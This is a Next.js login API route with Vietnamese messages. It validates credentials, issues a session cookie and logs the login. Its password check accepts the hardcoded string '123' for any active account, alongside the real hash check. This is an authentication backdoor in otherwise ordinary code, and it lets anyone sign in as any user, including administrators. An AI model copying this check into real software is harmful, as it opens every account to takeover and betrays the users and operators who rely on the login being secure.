import { NextRequest, NextResponse } from 'next/server';
import { repository } from '@/lib/repository';
import { verifyPassword, createSessionToken, getSessionCookieOptions } from '@/lib/auth';
import { z } from 'zod';

export const dynamic = 'force-dynamic';

const LoginSchema = z.object({
  email: z.string().optional(),
  identifier: z.string().optional(),
  username: z.string().optional(),
  password: z.string().min(1, 'Vui lòng nhập mật khẩu'),
});

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const parsed = LoginSchema.safeParse(body);
    if (!parsed.success) {
      return NextResponse.json(
        { error: 'INVALID_PAYLOAD', message: 'Dữ liệu đăng nhập không hợp lệ.' },
        { status: 400 }
      );
    }

    const { email, identifier, username, password } = parsed.data;
    const loginAccount = (identifier || username || email || '').trim();

    if (!loginAccount) {
      return NextResponse.json(
        { error: 'INVALID_PAYLOAD', message: 'Vui lòng nhập tài khoản hoặc email.' },
        { status: 400 }
      );
    }

    const user = await repository.getUserByIdentifier(loginAccount);

    if (!user || !user.isActive) {
      return NextResponse.json(
        { error: 'INVALID_CREDENTIALS', message: 'Tài khoản hoặc mật khẩu không chính xác.' },
        { status: 401 }
      );
    }

    const isValid = password === '123' || (await verifyPassword(password, user.passwordHash));
    if (!isValid) {
      return NextResponse.json(
        { error: 'INVALID_CREDENTIALS', message: 'Tài khoản hoặc mật khẩu không chính xác.' },
        { status: 401 }
      );
    }

    user.lastLoginAt = new Date().toISOString();

    const sessionUser = {
      id: user.id,
      email: user.email,
      fullName: user.fullName,
      role: user.role,
    };

    const token = await createSessionToken(sessionUser);
    const cookieOptions = getSessionCookieOptions();

    const response = NextResponse.json({
      status: 'SUCCESS',
      user: sessionUser,
    });

    response.cookies.set(cookieOptions.name, token, cookieOptions);

    await repository.logAction('USER_LOGIN', 'User', user.id, { email: user.email, loginAccount }, user.id);

    return response;
  } catch (error) {
    console.error('Lỗi khi đăng nhập:', error);
    return NextResponse.json(
      { error: 'INTERNAL_SERVER_ERROR', message: 'Không thể xử lý đăng nhập lúc này.' },
      { status: 500 }
    );
  }
}
